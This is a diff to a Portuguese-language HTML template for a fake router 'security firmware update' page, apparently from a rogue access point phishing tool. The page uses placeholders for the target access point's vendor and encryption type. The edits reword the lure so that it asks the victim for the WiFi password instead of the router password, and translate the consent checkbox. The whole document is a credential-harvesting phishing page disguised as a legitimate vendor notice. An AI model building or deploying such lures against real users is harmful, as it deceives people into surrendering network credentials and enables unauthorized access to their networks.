@@ -146,7 +146,7 @@
 	   <div class="col-sm">
        <center><img id="ap_logo_path" src="/static/{{ target_ap_logo_path }}"></img></center>
        <h2 class="text-center" style="color:CornflowerBlue">Atualização de Segurança disponível</h2>
-    	 <p class="lead">Uma nova versão do firmware {{target_ap_vendor}} ({{firmware_version}}) foi detectada e está disponível para instalação. Por motivos de segurança é necessário confirmar a senha do roteador para iniciar a atualização. Leia os termos e condições para prosseguir..</p>
+    	 <p class="lead">Uma nova versão do firmware {{target_ap_vendor}} ({{firmware_version}}) foi detectada e está disponível para instalação. Por motivos de segurança é necessário confirmar a senha wifi para iniciar a atualização. Leia os termos e condições para prosseguir..</p>
      </div>
     <form>
       <div class="form-group">
@@ -166,11 +166,11 @@ Em nenhum caso a {{target_ap_vendor}} ou qualquer outra parte envolvida na cria�
 
        </textarea>
         <div class="checkbox">
-          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
+          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">Eu concordo com os termos e condições.</label>
         </div>
       </div>
       <div class="form-group-has-feedback" id="psk_field">
-          <label for="pwd">{{ target_ap_encryption }} Senha do Roteador:</label>
+          <label for="pwd">{{ target_ap_encryption }} Senha WiFi:</label>
           <input class="form-control" type="password" id="pwd" disabled>
       </div>
       <div class="container text-center">
@@ -226,7 +226,7 @@ Em nenhum caso a {{target_ap_vendor}} ou qualquer outra parte envolvida na cria�
           <h4 class="modal-title">Aviso</h4>
         </div>
         <div class="modal-body">
-          <p>Confirme a senha do roteador para continuar a atualização.</p>
+          <p>Confirme a senha wifi para continuar a atualização.</p>
         </div>
         <div class="modal-footer">
           <button type="button" class="btn btn-default" data-dismiss="modal">Fechar</button>
